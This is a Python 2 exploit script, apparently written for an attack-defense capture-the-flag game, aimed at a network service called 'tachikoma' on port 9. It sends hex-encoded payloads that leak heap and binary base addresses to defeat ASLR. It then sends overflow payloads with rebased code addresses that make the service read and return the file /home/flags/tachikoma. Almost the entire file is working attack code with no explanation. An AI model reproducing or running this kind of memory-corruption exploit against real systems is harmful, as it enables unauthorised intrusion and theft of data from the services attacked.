import socket
import struct
import time
import telnetlib
import os
import sys

service = 'tachikoma'         # target service (required)
timeout = 3                 # define timeout here
author = 'm3m3d4'          # author

host = 'localhost'
port = 9

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

def exploit(host):
	port = 9
	ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ss.connect((host, port))
	f = ss.makefile('rw', bufsize=0)

	offset = 0x13f48
	s = '310a3436360a0a5573656c6573730a7b0a20207072696e74282022626262622220290a7d0a436f72650a7b0a7d0a496e69740a7b0a20206e616d65282022626f622220290a20205f74726573756c745f3330203d20300a20205f74726573756c745f3332203d203132382e300a20207072696e742820225052454c45414b2220290a20207072696e7428205f74726573756c745f313020290a20207072696e7428205f74726573756c745f383420290a20207072696e742820224c45414b45442220290a20207072696e74282022434f4445d66161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161612220290a7d0a'.decode('hex')

	f.write(s)

	#t = telnetlib.Telnet()
	#t.sock = ss
	#t.interact()

	readuntil(f, 'debug: bob: PRELEAK\n')
	readuntil(f, 'bob: ')
	v = readuntil(f, '\n')
	v = v.strip().split('.')
	if v[0][0] == '-':
		v[0] = v[0][1:]
	v[1] = '1' + v[1]
	print v
	high = (int(v[0]) << 1)
	low = int(v[1]) << 15
	heap_addr = low + high
	print 'heap: %s' % hex(heap_addr)

	readuntil(f, 'bob: ')
	v = readuntil(f, '\n')
	readuntil(f, 'CODE')
	v = v.strip().split('.')
	if v[0][0] == '-':
		v[0] = v[0][1:]
	v[1] = '1' + v[1]
	print v
	high = (int(v[0]) << 1)
	low = int(v[1]) << 15
	leak_addr = low + high
	binary_base = leak_addr - offset
	print 'binary_base: %s' % hex(binary_base)
	
	s1 = '310a3531350a0a5573656c6573730a7b0a20207072696e74282022626262622220290a7d0a436f72650a7b0a7d0a496e69740a7b0a20206e616d6528202241414141414141414141414141414141c28371f7626262626363636364646464807271f7c28371f7ddccbbaaecd850f9ddccbbaa2220290a20205f74726573756c745f3330203d20300a20205f74726573756c745f3332203d203132382e300a20207072696e742820225052454c45414b2220290a20207072696e7428205f74726573756c745f313020290a20207072696e7428205f74726573756c745f383420290a20207072696e742820224c45414b45442220290a20207072696e74282022434f4445d66161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161612220290a7d0a'
	s1 = s1.decode('hex')
	#print s1.find('\xf7')
	index = 0
	while index < len(s1):
		index = s1.find('\xf7', index)
		if index == -1: break
		v = up(s1[index - 3:index + 1])
		v = v - 0xf7716000 + binary_base
		#print index, hex(v)
		s1 = s1[:index - 3] + p(v) + s1[index + 1:]
		index += 4

	index = 0
	while index < len(s1):
		index = s1.find('\xf9', index)
		if index == -1: break
		v = up(s1[index - 3:index + 1])
		v = v - 0xf949e378 + heap_addr
		#print index, hex(v)
		s1 = s1[:index - 3] + p(v) + s1[index + 1:]
		index += 4

	f.write(s1)

	#raw_input('debug')

	s2 = '310a3137320a0a5573656c6573730a7b0a20207072696e74282022626262622220290a7d0a436f72650a7b0a7d0a496e69740a7b0a20206e616d65282022c8d850f9c28371f72220290a20207072696e7428205f74726573756c745f383420290a20205f74726573756c745f3833203d205f74726573756c745f32300a20205f74726573756c745f3834203d205f74726573756c745f32310a20207072696e742820226a6f627320646f6e652220290a7d0a'.decode('hex')
	index = 0
	while index < len(s2):
		index = s2.find('\xf7', index)
		if index == -1: break
		v = up(s2[index - 3:index + 1])
		v = v - 0xf7716000 + binary_base
		#print index, hex(v)
		s2 = s2[:index - 3] + p(v) + s2[index + 1:]
		index += 4

	index = 0
	while index < len(s2):
		index = s2.find('\xf9', index)
		if index == -1: break
		v = up(s2[index - 3:index + 1])
		v = v - 0xf949e378 + heap_addr
		#print index, hex(v)
		s2 = s2[:index - 3] + p(v) + s2[index + 1:]
		index += 4

	f.write(s2)

	s3 = '807371f7c28371f76cd950f90000000000000000807271f7c28371f706000000acd950f91a000000d07371f7c28371f701000000acd950f91a000000d07371f7c28371f701000000006071f7040000006161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161612f686f6d652f666c6167732f74616368696b6f6d61'
	s3 = s3.decode('hex')

	index = 0
	while index < len(s3):
		index = s3.find('\xf7', index)
		if index == -1: break
		v = up(s3[index - 3:index + 1])
		v = v - 0xf7716000 + binary_base
		#print index, hex(v)
		s3 = s3[:index - 3] + p(v) + s3[index + 1:]
		index += 4

	index = 0
	while index < len(s3):
		index = s3.find('\xf9', index)
		if index == -1: break
		v = up(s3[index - 3:index + 1])
		v = v - 0xf949e378 + heap_addr
		#print index, hex(v)
		s3 = s3[:index - 3] + p(v) + s3[index + 1:]
		index += 4

	f.write(s3)

	ret = readuntil(f, '\x7f\x45\x4c')
	flag = ret[-26:]
	print flag
	#print len(flag)

	return flag
	t = telnetlib.Telnet()
	t.sock = ss
	t.interact()


if __name__ == '__main__':
    exploit('192.168.165.135')


#from pwn import *
#p = process("./tachikoma")
#raw_input("debug")
#p.send(s)
#p.interactive()
